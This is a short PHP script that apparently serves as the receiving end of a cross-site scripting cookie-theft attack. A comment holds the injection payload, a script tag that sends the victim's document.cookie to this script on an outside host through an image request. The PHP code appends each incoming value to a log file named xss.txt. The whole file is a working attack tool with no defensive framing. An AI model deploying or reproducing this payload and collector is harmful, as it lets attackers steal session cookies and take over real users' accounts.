<?php
//<script>document.write('<img src="http://.../xss.php?a=' + document.cookie + '" />')</script>
if(strlen($_GET['a'])>1){
	$data = $_GET['a'].PHP_EOL;
	file_put_contents('xss.txt', $data, FILE_APPEND);
}
?>
